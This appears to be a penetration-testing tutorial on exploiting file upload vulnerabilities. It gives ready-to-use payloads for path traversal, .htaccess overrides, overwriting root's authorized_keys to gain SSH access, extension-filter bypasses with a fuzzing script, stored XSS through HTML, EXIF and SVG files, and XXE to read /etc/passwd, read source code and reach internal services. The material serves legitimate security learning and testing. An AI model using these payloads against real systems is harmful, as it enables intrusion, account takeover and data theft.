Even when a web application restricts uploads to specific file types (e.g. images or documents), it may still be vulnerable.

This happens because validation usually checks if the file **looks valid**, but not how it will be **processed or rendered later**.

As a result:

> Allowed file types can still introduce vulnerabilities depending on how the application handles them.

---

## Using Non-Executable File Uploads

A file upload vulnerability does not always allow direct code execution. In some cases, the backend does not interpret uploaded files (e.g., no PHP), so webshells are useless.

However, the vulnerability can still be exploited by combining it with **Directory Traversal**.


### Path Injection via Filename

If the application does not sanitize the `filename` parameter, we can inject relative paths:

```http
Content-Disposition: form-data; name="file"; filename="../../../../../../../tmp/test.txt"
```

This may allow writing files **outside the upload directory**.

The result is often blind, so success must be assumed and tested indirectly.

### Arbitrary File Write - Configuration Files

A file upload vulnerability does not always allow direct code execution. In many cases, the server blocks executable extensions such as `.php`, `.phtml` or `.jsp`, so direct webshell uploads are not possible.

Even in this situation, the vulnerability can still be useful by abusing how the server handles configuration files or file interpretation rules.

For example, in Apache-based environments, if `.htaccess` files are allowed, an attacker can upload a configuration file to modify how the server interprets certain extensions. This can be used to bypass upload filters by forcing non-executable extensions to be treated as executable.

Create a file named `.htaccess` with just this content

```apache
AddType application/x-httpd-php .php20
```

With this, a file like `shell.php20` could potentially be executed as PHP if placed in a directory where `.htaccess` is processed.




### Arbitrary File Write - SSH Access

Instead of uploading a shell, we overwrite sensitive files like:

```text
/root/.ssh/authorized_keys
```

Prepare a key:

```bash
ssh-keygen -t rsa -f fileup
cat fileup.pub > authorized_keys
```

Upload it with traversal:

```text
filename=../../../../../../../root/.ssh/authorized_keys
```

### Access via SSH

```bash
ssh -i fileup root@target 
```

If successful, we get access without a password.


---

## Bypassing Extension Filters in Nginx

Some Nginx configurations attempt to restrict the execution of certain file types, such as `.php`, to prevent unauthorized code execution. However, misconfigurations can allow attackers to bypass these restrictions and execute scripts by exploiting how Nginx handles file paths.

#### Example Scenario

Imagine an upload directory where only image files (e.g., `.png`, `.jpg`) are allowed, and `.php` files are blocked. However, an attacker uploads a file named `rev.png/rev.php`, resulting in a directory structure like:

```
/uploads/rev.png
```

Now, if Nginx is misconfigured and allows execution of PHP files in subdirectories, the attacker might be able to execute the script with a request like:

```
http://example.com/uploads/rev.png/rev.php?cmd=whoami
```


----

## PHP Character Injection

Some applications validate file uploads by checking the extension, but they may misinterpret filenames if special characters are injected.

By adding specific characters before or after the extension, we can trick the server into **bypassing the whitelist** and executing the file as PHP.

### Common Characters

```bash
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

Each character can affect how the filename is parsed.

#### Examples

- **Null byte (old PHP versions):**
    

```bash
shell.php%00.jpg
```

The server stops at `%00` → saved as `shell.php`

- **Windows bypass:**
    

```bash
shell.aspx:.jpg
```

The file may be interpreted as `shell.aspx`

### Fuzzing Filenames

We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

This wordlist can be used to bypass the whitelist test and execute PHP code.

---

## XSS via File Upload

Cross-Site Scripting (XSS) can occur when uploaded files are later **rendered in a browser** without proper sanitization.

If the application allows uploading files that can contain HTML or JavaScript, an attacker can inject a payload that executes when another user views the file.

### HTML Files

If `.html` uploads are allowed, the attack is straightforward:

```html
<script>alert(document.domain)</script>
```

The browser will directly interpret this file, and the script will execute when accessed. This leads to **Stored XSS**, since the payload is saved on the server.

### Image Metadata

Some applications extract and display image metadata (e.g. comments, author).

If this data is not sanitized, it can be used for XSS:

```bash
exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
```

Here, the payload is stored inside the image. When the application displays the metadata in HTML, the browser interprets it and executes the JavaScript.

### SVG Files

SVG images are actually **XML documents rendered by the browser**, not just static images.

This means they can contain JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

When the SVG is viewed, the browser parses it and executes the script. This makes SVG a common vector for XSS even when only “images” are allowed.

---

## XXE via File Upload

If the application processes XML-based files (such as SVG), it may be vulnerable to **XML External Entity (XXE)** attacks.

XXE allows an attacker to make the server read local files or perform internal requests.


### Basic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

When the server parses this XML, it resolves the entity and includes the content of `/etc/passwd`. If the output is reflected, the attacker can read it.


### Reading Application Source Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

This uses a PHP wrapper to encode the file, allowing the attacker to retrieve the source code safely.

Access to source code is very valuable because it may reveal:

- Upload directories
    
- Validation logic
    
- Additional vulnerabilities
    

### SSRF via XXE

XXE can also be used to make the server send requests:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
```

This allows interaction with internal services that are not externally accessible.
